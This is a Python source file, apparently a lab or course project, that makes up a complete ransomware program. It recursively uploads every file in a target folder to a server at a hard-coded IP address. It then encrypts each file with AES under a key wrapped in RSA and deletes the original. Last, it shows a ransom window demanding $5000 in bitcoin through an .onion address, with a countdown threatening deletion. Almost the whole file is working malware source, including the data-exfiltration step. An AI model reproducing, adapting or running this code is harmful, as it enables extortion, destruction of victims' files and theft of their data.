# Created by: iTrox


import base64
import os
import tkinter as tk
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import requests

# Variables
directory = 'C:\\Users\\user\\Desktop\\keepcoding\\'
excludeExtension = ['.py', '.pem', '.exe']
server_url = "http://192.168.1.237:7000/upload"

# Public key with base64 encoding
publicKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFod3Vqbm13U2N1dGRjWGljQVN0TwowcVdkcDhDNzNvUUw5Yi9LSjJiQ005SHM3U08wYWh0V3RMVWZjYUtEYW5hb0czMkxmTnVvZnBCZHNQTkN3WjZKCjRNWitiVEVLSnJLNDdQNnI2Yk5UY0hnUTR6ZjdYSmNRaVVrNnJ5amhkdFpzMVB4RnNBOElLWXRnaCt1L3hVdTUKWlBSSXpWWkNycTdMZ2NYelN0c1BGbmNkMXk3bDc1dkRYenVua0VQUEZZSUNEQnRzTVRNWDZ6SEFqZCs5NUwzYgpxVldIbkFjTzZ2azFnM3dodjJrOEZUK2JHcVhkcjc3akt4R2N5SWhSMFJpZWswMUVRSHlQZWdEZktiTWZiMEh5CnY4b0xtMnEyN0FCTXA2blp2cFU3V3lBSDZlUjJ1VngwUXdVSkFHSVdRS1hDSUo1dlJFODl5WnV5QkduOHhTT0wKQ3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
publicKey = base64.b64decode(publicKey)

# Function: directory scan
def scanRecurse(baseDir):
	for entry in os.scandir(baseDir):
		if entry.is_file():
			yield entry
		else:
			yield from scanRecurse(entry.path)

# Function: send files to api server
def send(files, server_url):
        for file_path in files:
                with open(file_path, 'rb') as f:
                     files = {"file": (file_path.name, f)}
                     requests.post(url=server_url, files=files)

all_files = list(scanRecurse(directory))
send(all_files, server_url)

# Function: encryption
def encrypt(dataFile, publicKey):
	
	# Read data from file
	extension = dataFile.suffix.lower()
	dataFile = str(dataFile)
	with open(dataFile, 'rb') as f:
		data = f.read()

	# Convert data to bytes
	data = bytes(data)

	# Create public key object
	key = RSA.import_key(publicKey)
	sessionKey = os.urandom(16)

	# Encrypt the session key with the pub key
	cipher = PKCS1_OAEP.new(key)
	encryptedSessionKey = cipher.encrypt(sessionKey)

	# Encrypt the data with the session key
	cipher = AES.new(sessionKey, AES.MODE_EAX)
	ciphertext, tag = cipher.encrypt_and_digest(data)

	# Save the encrypted data to file
	fileDirectory = filePath.parent
	encryptedFile = fileDirectory / f"{filePath.stem}{extension}.h4ck3d"
	with open(encryptedFile, 'wb') as f:
		[f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
	os.remove(dataFile)

for item in scanRecurse(directory):
	filePath = Path(item)
	fileType = filePath.suffix.lower()

	if fileType in excludeExtension:
		continue
	encrypt(filePath, publicKey)

# Create ransomware window
def countdown(count):
	hour, minute, second = count.split(':')
	hour = int(hour)
	minute = int(minute)
	second = int(second)

	label['text'] = '{}:{}:{}'.format(hour, minute, second)

	if second > 0 or minute > 0 or hour > 0:
		if second > 0:
			second -=1
		elif minute > 0:
			minute -=1
			second =59
		elif hour > 0:
			hour -=1
			minute = 59
			second = 59
		root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))

root = tk.Tk()
root.title('1Tr0xWar3')
root.geometry('600x720')
root.resizable(False, False)
label1 = tk.Label(root, text = 'Infected by 1Tr0xWar3!!!\n', font=('calibri', 40, 'bold'))
label1.pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg = 'white', bg = 'red')
label.pack()
label2 = tk.Label(root, text = '\n\nYour documents, images and important files have been encrypted under a unique\n key generated for this system. The decryption key is located on a secret server on\n the Internet. No one can decrypt your information until a payment is made and you\n obtain the private key.', font=('calibri', 12, 'bold'))
label2.pack()
label3 = tk.Label(root, text = '\nPAYMENT INFORMATION!', font=('calibri', 14, 'bold'), fg = 'red')
label3.pack()
label4 = tk.Label(root, text = '\nAmount: $5000 USD\n Bitcoin address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', font=('calibri', 12, 'bold'), fg = 'red')
label4.pack()
label5 = tk.Label(root, text = '\nMake the payment of the indicated amount in the detailed bitcoin address through\n the following web page:\n4p7g3z4w23r67ao9pqupl4pq6kufc4m.onion', font=('calibri', 12, 'bold'))
label5.pack()
label6 = tk.Label(root, text = '\nIf time runs out, the files will be deleted!', font=('calibri', 15, 'bold'), fg = 'red')
label6.pack()
label7 = tk.Label(root, text = '\nTIME IS TICKING!!!', font=('calibri', 30, 'bold'), fg = 'red')
label7.pack()

countdown ('02:00:00')
root.mainloop()
